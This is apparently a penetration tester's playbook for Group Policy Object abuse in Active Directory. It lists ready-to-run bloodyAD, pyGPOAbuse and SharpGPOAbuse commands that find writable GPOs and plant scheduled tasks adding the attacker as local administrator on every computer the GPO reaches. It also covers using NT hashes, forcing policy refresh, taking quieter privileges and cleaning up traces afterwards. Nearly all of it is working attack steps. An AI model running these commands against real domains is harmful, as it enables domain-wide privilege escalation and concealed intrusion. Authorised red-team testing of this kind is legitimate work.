# GPO abuse

## Find a GPO I can edit
- [ ] From BloodHound: an edge from an account I own to a GPO: GenericWrite, WriteDacl, WriteOwner or GenericAll
- [ ] The OUs the GPO is linked to, and the computers and users under them: that is who I hit
At the pwn-broker prompt: tool install bloodyad.
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' get writable --detail
- [ ] The GPO's displayName and its {GUID} noted: THE-GPO-NAME and THE-GPO-ID below, with no braces in THE-GPO-ID
- [ ] WriteOwner or WriteDacl only, not write yet: take the rights first, as in :Pb acl-abuse

## From Kali
pyGPOAbuse, from https://github.com/Hackndo/pyGPOAbuse, edits the GPO in SYSVOL to add an immediate scheduled task; clone it, it is not a package.
python3 pygpoabuse.py '<Domain>/<Username>:<Password>' -gpo-id 'THE-GPO-ID'
- [ ] With no command it adds a local admin named john, with the published default password 'H4x00r123..', on every computer the GPO applies to
python3 pygpoabuse.py '<Domain>/<Username>:<Password>' -gpo-id 'THE-GPO-ID' -command 'net localgroup administrators <Username> /add' -taskname 'Update' -description 'Update'
- [ ] An NT hash instead of the password: add -hashes ':<Hash>'

## From a Windows shell
SharpGPOAbuse, built from https://github.com/FSecureLABS/SharpGPOAbuse, which publishes no binary, into upload/ for serve, run as the account that can edit the GPO.
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <Username> --GPOName 'THE-GPO-NAME'
.\SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author <Domain>\<Username> --Command 'cmd.exe' --Arguments '/c net localgroup administrators <Username> /add' --GPOName 'THE-GPO-NAME'
- [ ] --AddUserRights with SeDebugPrivilege or SeTakeOwnershipPrivilege is quieter than a local admin
- [ ] --GPOName is the display name, not the GUID

## Make it apply
- [ ] The change lands at the next refresh, within 90 minutes, or at once on a host I already hold
gpupdate /force
- [ ] A computer task runs as SYSTEM at the computer's refresh; a user task waits for a logon

## Clean up and next
- [ ] The task removed from the GPO with pyGPOAbuse's --cleanup, which deletes ScheduledTasks.xml
python3 pygpoabuse.py '<Domain>/<Username>:<Password>' -gpo-id 'THE-GPO-ID' --cleanup
- [ ] The local admin the task added removed once I have what I need
- [ ] Any right or ownership I took on the GPO set back: :Pb acl-abuse
- [ ] A new local admin on the target, used from Kali: :Pb lateral-movement
